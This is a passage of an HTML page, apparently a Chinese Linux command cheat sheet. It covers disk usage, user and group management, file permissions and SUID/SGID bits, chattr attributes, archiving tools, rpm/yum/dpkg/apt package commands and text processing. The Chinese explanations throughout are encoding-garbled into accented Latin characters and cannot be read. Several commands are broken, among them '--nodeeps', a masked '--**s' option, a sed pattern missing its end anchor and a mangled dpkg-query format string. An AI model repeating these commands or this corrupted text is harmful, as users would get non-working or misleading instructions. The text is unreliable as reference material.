ÊåÇËΩΩ‰∏Ä‰∏™windowsÁΩëÁªúÂÖ±‰∫´</code></pre><h2 id="Á£ÅÁõòÁ©∫Èó¥"><a href="#Á£ÅÁõòÁ©∫Èó¥" class="headerlink" title="Á£ÅÁõòÁ©∫Èó¥"></a>Á£ÅÁõòÁ©∫Èó¥</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">df</span> -h ÊòæÁ§∫Â∑≤ÁªèÊåÇËΩΩÁöÑÂàÜÂå∫ÂàóË°® <span class="token function">ls</span> -lSr <span class="token operator">|</span><span class="token function">more</span> ‰ª•Â∞∫ÂØ∏Â§ßÂ∞èÊéíÂàóÊñá‰ª∂ÂíåÁõÆÂΩï <span class="token function">du</span> -sh dir1 ‰º∞ÁÆóÁõÆÂΩï <span class="token string">'dir1'</span> Â∑≤Áªè‰ΩøÁî®ÁöÑÁ£ÅÁõòÁ©∫Èó¥<span class="token string">' du -sk * | sort -rn ‰ª•ÂÆπÈáèÂ§ßÂ∞è‰∏∫‰æùÊçÆ‰æùÊ¨°ÊòæÁ§∫Êñá‰ª∂ÂíåÁõÆÂΩïÁöÑÂ§ßÂ∞è rpm -q -a --qf '</span>%10<span class="token punctuation">{</span>SIZE<span class="token punctuation">}</span>t%<span class="token punctuation">{</span>NAME<span class="token punctuation">}</span>n<span class="token string">' | sort -k1,1n ‰ª•Â§ßÂ∞è‰∏∫‰æùÊçÆ‰æùÊ¨°ÊòæÁ§∫Â∑≤ÂÆâË£ÖÁöÑrpmÂåÖÊâÄ‰ΩøÁî®ÁöÑÁ©∫Èó¥ (fedora, redhatÁ±ªÁ≥ªÁªü) dpkg-query -W -f='</span>Installed‚àíSize<span class="token punctuation">;</span>10tInstalled‚àíSize<span class="token punctuation">;</span>10t<span class="token punctuation">{</span>Package<span class="token punctuation">}</span>n' <span class="token operator">|</span> <span class="token function">sort</span> -k1,1n ‰ª•Â§ßÂ∞è‰∏∫‰æùÊçÆÊòæÁ§∫Â∑≤ÂÆâË£ÖÁöÑdebÂåÖÊâÄ‰ΩøÁî®ÁöÑÁ©∫Èó¥ <span class="token punctuation">(</span>ubuntu, debianÁ±ªÁ≥ªÁªü<span class="token punctuation">)</span></code></pre><h2 id="Áî®Êà∑ÂíåÁæ§ÁªÑ"><a href="#Áî®Êà∑ÂíåÁæ§ÁªÑ" class="headerlink" title="Áî®Êà∑ÂíåÁæ§ÁªÑ"></a>Áî®Êà∑ÂíåÁæ§ÁªÑ</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">groupadd</span> group_name ÂàõÂª∫‰∏Ä‰∏™Êñ∞Áî®Êà∑ÁªÑ <span class="token function">groupdel</span> group_name Âà†Èô§‰∏Ä‰∏™Áî®Êà∑ÁªÑ <span class="token function">groupmod</span> -n new_group_name old_group_name ÈáçÂëΩÂêç‰∏Ä‰∏™Áî®Êà∑ÁªÑ <span class="token function">useradd</span> -c <span class="token string">"Name Surname "</span> -g admin -d /home/user1 -s /bin/bash user1 ÂàõÂª∫‰∏Ä‰∏™Â±û‰∫é <span class="token string">"admin"</span> Áî®Êà∑ÁªÑÁöÑÁî®Êà∑ <span class="token function">useradd</span> user1 ÂàõÂª∫‰∏Ä‰∏™Êñ∞Áî®Êà∑ <span class="token function">userdel</span> -r user1 Âà†Èô§‰∏Ä‰∏™Áî®Êà∑ <span class="token punctuation">(</span> <span class="token string">'-r'</span> ÊéíÈô§‰∏ªÁõÆÂΩï<span class="token punctuation">)</span> <span class="token function">usermod</span> -c <span class="token string">"User FTP"</span> -g system -d /ftp/user1 -s /bin/nologin user1 ‰øÆÊîπÁî®Êà∑Â±ûÊÄß <span class="token function">passwd</span> ‰øÆÊîπÂè£‰ª§ <span class="token function">passwd</span> user1 ‰øÆÊîπ‰∏Ä‰∏™Áî®Êà∑ÁöÑÂè£‰ª§ <span class="token punctuation">(</span>Âè™ÂÖÅËÆ∏rootÊâßË°å<span class="token punctuation">)</span> chage -E 2005-12-31 user1 ËÆæÁΩÆÁî®Êà∑Âè£‰ª§ÁöÑÂ§±ÊïàÊúüÈôê pwck Ê£ÄÊü• <span class="token string">'/etc/passwd'</span> ÁöÑÊñá‰ª∂Ê†ºÂºèÂíåËØ≠Ê≥ï‰øÆÊ≠£‰ª•ÂèäÂ≠òÂú®ÁöÑÁî®Êà∑ grpck Ê£ÄÊü• <span class="token string">'/etc/passwd'</span> ÁöÑÊñá‰ª∂Ê†ºÂºèÂíåËØ≠Ê≥ï‰øÆÊ≠£‰ª•ÂèäÂ≠òÂú®ÁöÑÁæ§ÁªÑ newgrp group_name ÁôªÈôÜËøõ‰∏Ä‰∏™Êñ∞ÁöÑÁæ§ÁªÑ‰ª•ÊîπÂèòÊñ∞ÂàõÂª∫Êñá‰ª∂ÁöÑÈ¢ÑËÆæÁæ§ÁªÑ</code></pre><h2 id="Êñá‰ª∂ÁöÑÊùÉÈôê"><a href="#Êñá‰ª∂ÁöÑÊùÉÈôê" class="headerlink" title="Êñá‰ª∂ÁöÑÊùÉÈôê"></a>Êñá‰ª∂ÁöÑÊùÉÈôê</h2><pre class=" language-bash"><code class="language-bash">-‚Äî‚Äî‰ΩøÁî® <span class="token string">"+"</span> ËÆæÁΩÆÊùÉÈôêÔºå‰ΩøÁî® <span class="token string">"-"</span> Áî®‰∫éÂèñÊ∂à <span class="token function">ls</span> -lh ÊòæÁ§∫ÊùÉÈôê <span class="token function">ls</span> /tmp <span class="token operator">|</span> <span class="token function">pr</span> -T5 -W<span class="token variable">$COLUMNS</span> Â∞ÜÁªàÁ´ØÂàíÂàÜÊàê5Ê†èÊòæÁ§∫ <span class="token function">chmod</span> ugo+rwx directory1 ËÆæÁΩÆÁõÆÂΩïÁöÑÊâÄÊúâ‰∫∫<span class="token punctuation">(</span>u<span class="token punctuation">)</span>„ÄÅÁæ§ÁªÑ<span class="token punctuation">(</span>g<span class="token punctuation">)</span>‰ª•ÂèäÂÖ∂‰ªñ‰∫∫<span class="token punctuation">(</span>o<span class="token punctuation">)</span>‰ª•ËØªÔºàr Ôºâ„ÄÅÂÜô<span class="token punctuation">(</span>w<span class="token punctuation">)</span>ÂíåÊâßË°å<span class="token punctuation">(</span>x<span class="token punctuation">)</span>ÁöÑÊùÉÈôê <span class="token function">chmod</span> go-rwx directory1 Âà†Èô§Áæ§ÁªÑ<span class="token punctuation">(</span>g<span class="token punctuation">)</span>‰∏éÂÖ∂‰ªñ‰∫∫<span class="token punctuation">(</span>o<span class="token punctuation">)</span>ÂØπÁõÆÂΩïÁöÑËØªÂÜôÊâßË°åÊùÉÈôê <span class="token function">chown</span> user1 file1 ÊîπÂèò‰∏Ä‰∏™Êñá‰ª∂ÁöÑÊâÄÊúâ‰∫∫Â±ûÊÄß <span class="token function">chown</span> -R user1 directory1 ÊîπÂèò‰∏Ä‰∏™ÁõÆÂΩïÁöÑÊâÄÊúâ‰∫∫Â±ûÊÄßÂπ∂ÂêåÊó∂ÊîπÂèòÊîπÁõÆÂΩï‰∏ãÊâÄÊúâÊñá‰ª∂ÁöÑÂ±ûÊÄß <span class="token function">chgrp</span> group1 file1 ÊîπÂèòÊñá‰ª∂ÁöÑÁæ§ÁªÑ <span class="token function">chown</span> user1:group1 file1 ÊîπÂèò‰∏Ä‰∏™Êñá‰ª∂ÁöÑÊâÄÊúâ‰∫∫ÂíåÁæ§ÁªÑÂ±ûÊÄß <span class="token function">find</span> / -perm -u+s ÁΩóÂàó‰∏Ä‰∏™Á≥ªÁªü‰∏≠ÊâÄÊúâ‰ΩøÁî®‰∫ÜSUIDÊéßÂà∂ÁöÑÊñá‰ª∂ <span class="token function">chmod</span> u+s /bin/file1 ËÆæÁΩÆ‰∏Ä‰∏™‰∫åËøõÂà∂Êñá‰ª∂ÁöÑ SUID ‰Ωç - ËøêË°åËØ•Êñá‰ª∂ÁöÑÁî®Êà∑‰πüË¢´Ëµã‰∫àÂíåÊâÄÊúâËÄÖÂêåÊ†∑ÁöÑÊùÉÈôê <span class="token function">chmod</span> u-s /bin/file1 Á¶ÅÁî®‰∏Ä‰∏™‰∫åËøõÂà∂Êñá‰ª∂ÁöÑ SUID‰Ωç <span class="token function">chmod</span> g+s /home/public ËÆæÁΩÆ‰∏Ä‰∏™ÁõÆÂΩïÁöÑSGID ‰Ωç - Á±ª‰ººSUID Ôºå‰∏çËøáËøôÊòØÈíàÂØπÁõÆÂΩïÁöÑ <span class="token function">chmod</span> g-s /home/public Á¶ÅÁî®‰∏Ä‰∏™ÁõÆÂΩïÁöÑ SGID ‰Ωç <span class="token function">chmod</span> o+t /home/public ËÆæÁΩÆ‰∏Ä‰∏™Êñá‰ª∂ÁöÑ STIKY ‰Ωç - Âè™ÂÖÅËÆ∏ÂêàÊ≥ïÊâÄÊúâ‰∫∫Âà†Èô§Êñá‰ª∂ <span class="token function">chmod</span> o-t /home/public Á¶ÅÁî®‰∏Ä‰∏™ÁõÆÂΩïÁöÑ STIKY ‰Ωç</code></pre><h2 id="Êñá‰ª∂ÁöÑÁâπÊÆäÂ±ûÊÄß"><a href="#Êñá‰ª∂ÁöÑÁâπÊÆäÂ±ûÊÄß" class="headerlink" title="Êñá‰ª∂ÁöÑÁâπÊÆäÂ±ûÊÄß"></a>Êñá‰ª∂ÁöÑÁâπÊÆäÂ±ûÊÄß</h2><pre class=" language-bash"><code class="language-bash">‚Äî‚Äî ‰ΩøÁî® <span class="token string">"+"</span> ËÆæÁΩÆÊùÉÈôêÔºå‰ΩøÁî® <span class="token string">"-"</span> Áî®‰∫éÂèñÊ∂à chattr +a file1 Âè™ÂÖÅËÆ∏‰ª•ËøΩÂä†ÊñπÂºèËØªÂÜôÊñá‰ª∂ chattr +c file1 ÂÖÅËÆ∏Ëøô‰∏™Êñá‰ª∂ËÉΩË¢´ÂÜÖÊ†∏Ëá™Âä®ÂéãÁº©/Ëß£Âéã chattr +d file1 Âú®ËøõË°åÊñá‰ª∂Á≥ªÁªüÂ§á‰ªΩÊó∂ÔºådumpÁ®ãÂ∫èÂ∞ÜÂøΩÁï•Ëøô‰∏™Êñá‰ª∂ chattr +i file1 ËÆæÁΩÆÊàê‰∏çÂèØÂèòÁöÑÊñá‰ª∂Ôºå‰∏çËÉΩË¢´Âà†Èô§„ÄÅ‰øÆÊîπ„ÄÅÈáçÂëΩÂêçÊàñËÄÖÈìæÊé• chattr +s file1 ÂÖÅËÆ∏‰∏Ä‰∏™Êñá‰ª∂Ë¢´ÂÆâÂÖ®Âú∞Âà†Èô§ chattr +S file1 ‰∏ÄÊó¶Â∫îÁî®Á®ãÂ∫èÂØπËøô‰∏™Êñá‰ª∂ÊâßË°å‰∫ÜÂÜôÊìç‰ΩúÔºå‰ΩøÁ≥ªÁªüÁ´ãÂàªÊää‰øÆÊîπÁöÑÁªìÊûúÂÜôÂà∞Á£ÅÁõò chattr +u file1 Ëã•Êñá‰ª∂Ë¢´Âà†Èô§ÔºåÁ≥ªÁªü‰ºöÂÖÅËÆ∏‰Ω†Âú®‰ª•ÂêéÊÅ¢Â§çËøô‰∏™Ë¢´Âà†Èô§ÁöÑÊñá‰ª∂ lsattr ÊòæÁ§∫ÁâπÊÆäÁöÑÂ±ûÊÄß</code></pre><h2 id="ÊâìÂåÖÂíåÂéãÁº©Êñá‰ª∂"><a href="#ÊâìÂåÖÂíåÂéãÁº©Êñá‰ª∂" class="headerlink" title="ÊâìÂåÖÂíåÂéãÁº©Êñá‰ª∂"></a>ÊâìÂåÖÂíåÂéãÁº©Êñá‰ª∂</h2><pre class=" language-bash"><code class="language-bash">bunzip2 file1.bz2 Ëß£Âéã‰∏Ä‰∏™Âè´ÂÅö <span class="token string">'file1.bz2'</span>ÁöÑÊñá‰ª∂ <span class="token function">bzip2</span> file1 ÂéãÁº©‰∏Ä‰∏™Âè´ÂÅö <span class="token string">'file1'</span> ÁöÑÊñá‰ª∂ gunzip file1.gz Ëß£Âéã‰∏Ä‰∏™Âè´ÂÅö <span class="token string">'file1.gz'</span>ÁöÑÊñá‰ª∂ <span class="token function">gzip</span> file1 ÂéãÁº©‰∏Ä‰∏™Âè´ÂÅö <span class="token string">'file1'</span>ÁöÑÊñá‰ª∂ <span class="token function">gzip</span> -9 file1 ÊúÄÂ§ßÁ®ãÂ∫¶ÂéãÁº© <span class="token function">rar</span> a file1.rar test_file ÂàõÂª∫‰∏Ä‰∏™Âè´ÂÅö <span class="token string">'file1.rar'</span> ÁöÑÂåÖ <span class="token function">rar</span> a file1.rar file1 file2 dir1 ÂêåÊó∂ÂéãÁº© <span class="token string">'file1'</span>, <span class="token string">'file2'</span> ‰ª•ÂèäÁõÆÂΩï <span class="token string">'dir1'</span> <span class="token function">rar</span> x file1.rar Ëß£ÂéãrarÂåÖ <span class="token function">unrar</span> x file1.rar Ëß£ÂéãrarÂåÖ <span class="token function">tar</span> -cvf archive.tar file1 ÂàõÂª∫‰∏Ä‰∏™ÈùûÂéãÁº©ÁöÑ tarball <span class="token function">tar</span> -cvf archive.tar file1 file2 dir1 ÂàõÂª∫‰∏Ä‰∏™ÂåÖÂê´‰∫Ü <span class="token string">'file1'</span>, <span class="token string">'file2'</span> ‰ª•Âèä <span class="token string">'dir1'</span>ÁöÑÊ°£Ê°àÊñá‰ª∂ <span class="token function">tar</span> -tf archive.tar ÊòæÁ§∫‰∏Ä‰∏™ÂåÖ‰∏≠ÁöÑÂÜÖÂÆπ <span class="token function">tar</span> -xvf archive.tar ÈáäÊîæ‰∏Ä‰∏™ÂåÖ <span class="token function">tar</span> -xvf archive.tar -C /tmp Â∞ÜÂéãÁº©ÂåÖÈáäÊîæÂà∞ /tmpÁõÆÂΩï‰∏ã <span class="token function">tar</span> -cvfj archive.tar.bz2 dir1 ÂàõÂª∫‰∏Ä‰∏™bzip2Ê†ºÂºèÁöÑÂéãÁº©ÂåÖ <span class="token function">tar</span> -xvfj archive.tar.bz2 Ëß£Âéã‰∏Ä‰∏™bzip2Ê†ºÂºèÁöÑÂéãÁº©ÂåÖ <span class="token function">tar</span> -cvfz archive.tar.gz dir1 ÂàõÂª∫‰∏Ä‰∏™gzipÊ†ºÂºèÁöÑÂéãÁº©ÂåÖ <span class="token function">tar</span> -xvfz archive.tar.gz Ëß£Âéã‰∏Ä‰∏™gzipÊ†ºÂºèÁöÑÂéãÁº©ÂåÖ <span class="token function">zip</span> file1.zip file1 ÂàõÂª∫‰∏Ä‰∏™zipÊ†ºÂºèÁöÑÂéãÁº©ÂåÖ <span class="token function">zip</span> -r file1.zip file1 file2 dir1 Â∞ÜÂá†‰∏™Êñá‰ª∂ÂíåÁõÆÂΩïÂêåÊó∂ÂéãÁº©Êàê‰∏Ä‰∏™zipÊ†ºÂºèÁöÑÂéãÁº©ÂåÖ unzip file1.zip Ëß£Âéã‰∏Ä‰∏™zipÊ†ºÂºèÂéãÁº©ÂåÖRPM ÂåÖ - ÔºàFedora, RedhatÂèäÁ±ª‰ººÁ≥ªÁªüÔºâ rpm -ivh package.rpm ÂÆâË£Ö‰∏Ä‰∏™rpmÂåÖ rpm -ivh --nodeeps package.rpm ÂÆâË£Ö‰∏Ä‰∏™rpmÂåÖËÄåÂøΩÁï•‰æùËµñÂÖ≥Á≥ªË≠¶Âëä rpm -U package.rpm Êõ¥Êñ∞‰∏Ä‰∏™rpmÂåÖ‰ΩÜ‰∏çÊîπÂèòÂÖ∂ÈÖçÁΩÆÊñá‰ª∂ rpm -F package.rpm Êõ¥Êñ∞‰∏Ä‰∏™Á°ÆÂÆöÂ∑≤ÁªèÂÆâË£ÖÁöÑrpmÂåÖ rpm -e package_name.rpm Âà†Èô§‰∏Ä‰∏™rpmÂåÖ rpm -qa ÊòæÁ§∫Á≥ªÁªü‰∏≠ÊâÄÊúâÂ∑≤ÁªèÂÆâË£ÖÁöÑrpmÂåÖ rpm -qa <span class="token operator">|</span> <span class="token function">grep</span> httpd ÊòæÁ§∫ÊâÄÊúâÂêçÁß∞‰∏≠ÂåÖÂê´ <span class="token string">"httpd"</span> Â≠óÊ†∑ÁöÑrpmÂåÖ rpm -qi package_name Ëé∑Âèñ‰∏Ä‰∏™Â∑≤ÂÆâË£ÖÂåÖÁöÑÁâπÊÆä‰ø°ÊÅØ rpm -qg <span class="token string">"System Environment/Daemons"</span> ÊòæÁ§∫‰∏Ä‰∏™ÁªÑ‰ª∂ÁöÑrpmÂåÖ rpm -ql package_name ÊòæÁ§∫‰∏Ä‰∏™Â∑≤ÁªèÂÆâË£ÖÁöÑrpmÂåÖÊèê‰æõÁöÑÊñá‰ª∂ÂàóË°® rpm -qc package_name ÊòæÁ§∫‰∏Ä‰∏™Â∑≤ÁªèÂÆâË£ÖÁöÑrpmÂåÖÊèê‰æõÁöÑÈÖçÁΩÆÊñá‰ª∂ÂàóË°® rpm -q package_name --whatrequires ÊòæÁ§∫‰∏é‰∏Ä‰∏™rpmÂåÖÂ≠òÂú®‰æùËµñÂÖ≥Á≥ªÁöÑÂàóË°® rpm -q package_name --whatprovides ÊòæÁ§∫‰∏Ä‰∏™rpmÂåÖÊâÄÂç†ÁöÑ‰ΩìÁßØ rpm -q package_name --**s ÊòæÁ§∫Âú®ÂÆâË£Ö/Âà†Èô§ÊúüÈó¥ÊâÄÊâßË°åÁöÑËÑöÊú¨l rpm -q package_name --changelog ÊòæÁ§∫‰∏Ä‰∏™rpmÂåÖÁöÑ‰øÆÊîπÂéÜÂè≤ rpm -qf /etc/httpd/conf/httpd.conf Á°ÆËÆ§ÊâÄÁªôÁöÑÊñá‰ª∂Áî±Âì™‰∏™rpmÂåÖÊâÄÊèê‰æõ rpm -qp package.rpm -l ÊòæÁ§∫Áî±‰∏Ä‰∏™Â∞öÊú™ÂÆâË£ÖÁöÑrpmÂåÖÊèê‰æõÁöÑÊñá‰ª∂ÂàóË°® rpm --import /media/cdrom/RPM-GPG-KEY ÂØºÂÖ•ÂÖ¨Èí•Êï∞Â≠óËØÅ‰π¶ rpm --checksig package.rpm Á°ÆËÆ§‰∏Ä‰∏™rpmÂåÖÁöÑÂÆåÊï¥ÊÄß rpm -qa gpg-pubkey Á°ÆËÆ§Â∑≤ÂÆâË£ÖÁöÑÊâÄÊúârpmÂåÖÁöÑÂÆåÊï¥ÊÄß rpm -V package_name Ê£ÄÊü•Êñá‰ª∂Â∞∫ÂØ∏„ÄÅ ËÆ∏ÂèØ„ÄÅÁ±ªÂûã„ÄÅÊâÄÊúâËÄÖ„ÄÅÁæ§ÁªÑ„ÄÅMD5Ê£ÄÊü•‰ª•ÂèäÊúÄÂêé‰øÆÊîπÊó∂Èó¥ rpm -Va Ê£ÄÊü•Á≥ªÁªü‰∏≠ÊâÄÊúâÂ∑≤ÂÆâË£ÖÁöÑrpmÂåÖ- Â∞èÂøÉ‰ΩøÁî® rpm -Vp package.rpm Á°ÆËÆ§‰∏Ä‰∏™rpmÂåÖËøòÊú™ÂÆâË£Ö rpm2cpio package.rpm <span class="token operator">|</span> cpio --extract --make-directories *bin* ‰ªé‰∏Ä‰∏™rpmÂåÖËøêË°åÂèØÊâßË°åÊñá‰ª∂ rpm -ivh /usr/src/redhat/RPMS/<span class="token variable"><span class="token variable">`</span>arch<span class="token variable">`</span></span>/package.rpm ‰ªé‰∏Ä‰∏™rpmÊ∫êÁ†ÅÂÆâË£Ö‰∏Ä‰∏™ÊûÑÂª∫Â•ΩÁöÑÂåÖ rpmbuild --rebuild package_name.src.rpm ‰ªé‰∏Ä‰∏™rpmÊ∫êÁ†ÅÊûÑÂª∫‰∏Ä‰∏™ rpm ÂåÖYUM ËΩØ‰ª∂ÂåÖÂçáÁ∫ßÂô® - ÔºàFedora, RedHatÂèäÁ±ª‰ººÁ≥ªÁªüÔºâ yum <span class="token function">install</span> package_name ‰∏ãËΩΩÂπ∂ÂÆâË£Ö‰∏Ä‰∏™rpmÂåÖ yum localinstall package_name.rpm Â∞ÜÂÆâË£Ö‰∏Ä‰∏™rpmÂåÖÔºå‰ΩøÁî®‰Ω†Ëá™Â∑±ÁöÑËΩØ‰ª∂‰ªìÂ∫ì‰∏∫‰Ω†Ëß£ÂÜ≥ÊâÄÊúâ‰æùËµñÂÖ≥Á≥ª yum update package_name.rpm Êõ¥Êñ∞ÂΩìÂâçÁ≥ªÁªü‰∏≠ÊâÄÊúâÂÆâË£ÖÁöÑrpmÂåÖ yum update package_name Êõ¥Êñ∞‰∏Ä‰∏™rpmÂåÖ yum remove package_name Âà†Èô§‰∏Ä‰∏™rpmÂåÖ yum list ÂàóÂá∫ÂΩìÂâçÁ≥ªÁªü‰∏≠ÂÆâË£ÖÁöÑÊâÄÊúâÂåÖ yum search package_name Âú®rpm‰ªìÂ∫ì‰∏≠ÊêúÂØªËΩØ‰ª∂ÂåÖ yum clean packages Ê∏ÖÁêÜrpmÁºìÂ≠òÂà†Èô§‰∏ãËΩΩÁöÑÂåÖ yum clean headers Âà†Èô§ÊâÄÊúâÂ§¥Êñá‰ª∂ yum clean all Âà†Èô§ÊâÄÊúâÁºìÂ≠òÁöÑÂåÖÂíåÂ§¥Êñá‰ª∂DEB ÂåÖ <span class="token punctuation">(</span>Debian, Ubuntu ‰ª•ÂèäÁ±ª‰ººÁ≥ªÁªü<span class="token punctuation">)</span> dpkg -i package.deb ÂÆâË£Ö/Êõ¥Êñ∞‰∏Ä‰∏™ deb ÂåÖ dpkg -r package_name ‰ªéÁ≥ªÁªüÂà†Èô§‰∏Ä‰∏™ deb ÂåÖ dpkg -l ÊòæÁ§∫Á≥ªÁªü‰∏≠ÊâÄÊúâÂ∑≤ÁªèÂÆâË£ÖÁöÑ deb ÂåÖ dpkg -l <span class="token operator">|</span> <span class="token function">grep</span> httpd ÊòæÁ§∫ÊâÄÊúâÂêçÁß∞‰∏≠ÂåÖÂê´ <span class="token string">"httpd"</span> Â≠óÊ†∑ÁöÑdebÂåÖ dpkg -s package_name Ëé∑ÂæóÂ∑≤ÁªèÂÆâË£ÖÂú®Á≥ªÁªü‰∏≠‰∏Ä‰∏™ÁâπÊÆäÂåÖÁöÑ‰ø°ÊÅØ dpkg -L package_name ÊòæÁ§∫Á≥ªÁªü‰∏≠Â∑≤ÁªèÂÆâË£ÖÁöÑ‰∏Ä‰∏™debÂåÖÊâÄÊèê‰æõÁöÑÊñá‰ª∂ÂàóË°® dpkg --contents package.deb ÊòæÁ§∫Â∞öÊú™ÂÆâË£ÖÁöÑ‰∏Ä‰∏™ÂåÖÊâÄÊèê‰æõÁöÑÊñá‰ª∂ÂàóË°® dpkg -S /bin/ping Á°ÆËÆ§ÊâÄÁªôÁöÑÊñá‰ª∂Áî±Âì™‰∏™debÂåÖÊèê‰æõAPT ËΩØ‰ª∂Â∑•ÂÖ∑ <span class="token punctuation">(</span>Debian, Ubuntu ‰ª•ÂèäÁ±ª‰ººÁ≥ªÁªü<span class="token punctuation">)</span> <span class="token function">apt-get</span> <span class="token function">install</span> package_name ÂÆâË£Ö/Êõ¥Êñ∞‰∏Ä‰∏™ deb ÂåÖ apt-cdrom <span class="token function">install</span> package_name ‰ªéÂÖâÁõòÂÆâË£Ö/Êõ¥Êñ∞‰∏Ä‰∏™ deb ÂåÖ <span class="token function">apt-get</span> update ÂçáÁ∫ßÂàóË°®‰∏≠ÁöÑËΩØ‰ª∂ÂåÖ <span class="token function">apt-get</span> upgrade ÂçáÁ∫ßÊâÄÊúâÂ∑≤ÂÆâË£ÖÁöÑËΩØ‰ª∂ <span class="token function">apt-get</span> remove package_name ‰ªéÁ≥ªÁªüÂà†Èô§‰∏Ä‰∏™debÂåÖ <span class="token function">apt-get</span> check Á°ÆËÆ§‰æùËµñÁöÑËΩØ‰ª∂‰ªìÂ∫ìÊ≠£Á°Æ <span class="token function">apt-get</span> clean ‰ªé‰∏ãËΩΩÁöÑËΩØ‰ª∂ÂåÖ‰∏≠Ê∏ÖÁêÜÁºìÂ≠ò apt-cache search searched-package ËøîÂõûÂåÖÂê´ÊâÄË¶ÅÊêúÁ¥¢Â≠óÁ¨¶‰∏≤ÁöÑËΩØ‰ª∂ÂåÖÂêçÁß∞ËøîÂõûÈ°∂ÈÉ®Á¥¢Âºï ^Êü•ÁúãÊñá‰ª∂ÂÜÖÂÆπ <span class="token function">cat</span> file1 ‰ªéÁ¨¨‰∏Ä‰∏™Â≠óËäÇÂºÄÂßãÊ≠£ÂêëÊü•ÁúãÊñá‰ª∂ÁöÑÂÜÖÂÆπ tac file1 ‰ªéÊúÄÂêé‰∏ÄË°åÂºÄÂßãÂèçÂêëÊü•Áúã‰∏Ä‰∏™Êñá‰ª∂ÁöÑÂÜÖÂÆπ <span class="token function">more</span> file1 Êü•Áúã‰∏Ä‰∏™ÈïøÊñá‰ª∂ÁöÑÂÜÖÂÆπ <span class="token function">less</span> file1 Á±ª‰ºº‰∫é <span class="token string">'more'</span> ÂëΩ‰ª§Ôºå‰ΩÜÊòØÂÆÉÂÖÅËÆ∏Âú®Êñá‰ª∂‰∏≠ÂíåÊ≠£ÂêëÊìç‰Ωú‰∏ÄÊ†∑ÁöÑÂèçÂêëÊìç‰Ωú <span class="token function">head</span> -2 file1 Êü•Áúã‰∏Ä‰∏™Êñá‰ª∂ÁöÑÂâç‰∏§Ë°å <span class="token function">tail</span> -2 file1 Êü•Áúã‰∏Ä‰∏™Êñá‰ª∂ÁöÑÊúÄÂêé‰∏§Ë°å <span class="token function">tail</span> -f /var/log/messages ÂÆûÊó∂Êü•ÁúãË¢´Ê∑ªÂä†Âà∞‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÁöÑÂÜÖÂÆπ</code></pre><h2 id="ÊñáÊú¨Â§ÑÁêÜ"><a href="#ÊñáÊú¨Â§ÑÁêÜ" class="headerlink" title="ÊñáÊú¨Â§ÑÁêÜ"></a>ÊñáÊú¨Â§ÑÁêÜ</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> file1 file2 <span class="token punctuation">..</span>. <span class="token operator">|</span> <span class="token function">command</span> <span class="token operator">&lt;</span><span class="token operator">></span> file1_in.txt_or_file1_out.txt general syntax <span class="token keyword">for</span> text manipulation using PIPE, STDIN and STDOUT <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">></span> result.txt ÂêàÂπ∂‰∏Ä‰∏™Êñá‰ª∂ÁöÑËØ¶ÁªÜËØ¥ÊòéÊñáÊú¨ÔºåÂπ∂Â∞ÜÁÆÄ‰ªãÂÜôÂÖ•‰∏Ä‰∏™Êñ∞Êñá‰ª∂‰∏≠ <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">>></span> result.txt ÂêàÂπ∂‰∏Ä‰∏™Êñá‰ª∂ÁöÑËØ¶ÁªÜËØ¥ÊòéÊñáÊú¨ÔºåÂπ∂Â∞ÜÁÆÄ‰ªãÂÜôÂÖ•‰∏Ä‰∏™Â∑≤ÊúâÁöÑÊñá‰ª∂‰∏≠ <span class="token function">grep</span> Aug /var/log/messages Âú®Êñá‰ª∂ <span class="token string">'/var/log/messages'</span>‰∏≠Êü•ÊâæÂÖ≥ÈîÆËØç<span class="token string">"Aug"</span> <span class="token function">grep</span> ^Aug /var/log/messages Âú®Êñá‰ª∂ <span class="token string">'/var/log/messages'</span>‰∏≠Êü•Êâæ‰ª•<span class="token string">"Aug"</span>ÂºÄÂßãÁöÑËØçÊ±á <span class="token function">grep</span> <span class="token punctuation">[</span>0-9<span class="token punctuation">]</span> /var/log/messages ÈÄâÊã© <span class="token string">'/var/log/messages'</span> Êñá‰ª∂‰∏≠ÊâÄÊúâÂåÖÂê´Êï∞Â≠óÁöÑË°å <span class="token function">grep</span> Aug -R /var/log/* Âú®ÁõÆÂΩï <span class="token string">'/var/log'</span> ÂèäÈöèÂêéÁöÑÁõÆÂΩï‰∏≠ÊêúÁ¥¢Â≠óÁ¨¶‰∏≤<span class="token string">"Aug"</span> <span class="token function">sed</span> <span class="token string">'s/stringa1/stringa2/g'</span> example.txt Â∞Üexample.txtÊñá‰ª∂‰∏≠ÁöÑ <span class="token string">"string1"</span> ÊõøÊç¢Êàê <span class="token string">"string2"</span> <span class="token function">sed</span> <span class="token string">'/^/d'</span> example.txt ‰ªéexample.txtÊñá‰ª∂‰∏≠Âà†Èô§ÊâÄÊúâÁ©∫ÁôΩË°å  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt ‰ªéexample.txtÊñá‰ª∂‰∏≠Âà†Èô§ÊâÄÊúâÁ©∫ÁôΩË°å  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt ‰ªéexample.txtÊñá‰ª∂‰∏≠Âà†Èô§ÊâÄÊúâÊ≥®ÈáäÂíåÁ©∫ÁôΩË°å <span class="token keyword">echo</span> <span class="token string">'esempio'</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'[:lower:]'</span> <span class="token string">'[:upper:]'</span> ÂêàÂπ∂‰∏ä‰∏ãÂçïÂÖÉÊ†ºÂÜÖÂÆπ <span class="token function">sed</span> -e <span class="token string">'1d'</span> result.txt ‰ªéÊñá‰ª∂example.txt ‰∏≠ÊéíÈô§Á¨¨‰∏ÄË°å <span class="token function">sed</span> -n <span class="token string">'/stringa1/p'</span> Êü•ÁúãÂè™ÂåÖÂê´ËØçÊ±á <span class="token string">"string1"</span>ÁöÑË°å <span class="token function">sed</span> -e <span class="token string">'s/ 